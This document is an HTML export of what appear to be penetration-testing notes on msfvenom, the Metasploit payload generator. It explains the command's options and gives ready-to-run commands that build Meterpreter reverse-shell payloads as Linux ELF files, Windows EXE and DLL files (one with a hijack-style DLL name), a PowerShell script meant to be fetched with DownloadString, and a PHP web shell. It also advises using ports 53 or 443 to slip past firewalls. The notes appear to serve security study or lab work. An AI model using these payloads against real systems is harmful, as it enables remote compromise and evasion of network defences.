<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>msfvenom</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>msfvenom</h1><br/><br />If we have the possibilities to upload a shell on the target and we are not limited by a command line,<br />we can use <strong>msfvenom</strong> that is part of the Metasploit Framework, which purpose is generate payloads<br /> <br />lport= &lt;port&gt; → <br />    local port(<strong>lport</strong>) where the client needs to connect has to be a common port like:<br />   ◇ 53 → DNS<br />   ◇ 443 → HTTPS <br />    These are commonly used ports and are less suspicious to get around firewall restrictions :) <br />    <br />-p, --payload → Payload to use, must be the same of the on used on the attacker machine<br />-f, --format → Output format<br />    <a href=""><img src="images/449-1.png" alt="images/449-1.png" /></a><br />    exe →  will create a Windows executable. <br />    elf → will create a Linux executable<br />    psh →  will create a powershell script you can execute right away<br />-o, --out → Save the payload in a output file<br /> <br /><strong><span style="color:#a5452a;">example</span></strong> <br /><div class="codebox"><pre>msfvenom -p linux<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter_reverse_tcp lhost=&lt;local-host&gt; lport=53 -f elf -o meter</pre></div><br /><br /><strong><span style="color:#a5452a;">example Windows:</span></strong><br /><div class="codebox"><pre>msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST=192.168.1.122 LPORT=2345 -f exe -o <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>exploit.exe</pre></div><br /><div class="codebox"><pre>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.122 LPORT=4444 -f dll -o /home/kali/Desktop/WTSAPI32.dll</pre></div><br /><br />ps1(powershell) file that we can download from the target with DownloadString<br /><div class="codebox"><pre>msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST=192.168.1.122 LPORT=2345 -f psh-reflection -o <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>exploit.ps1</pre></div><br /><br /><strong><span style="color:#a5452a;">example shell php</span></strong><br /><div class="codebox"><pre>msfvenom -p php<span style="color:#ff9d00;font-weight:700">/</span>meterpreter_reverse_tcp lhost=&lt;local-host&gt; lport=443 -o output.php</pre></div><br /><br /></div>
</body>
</html>
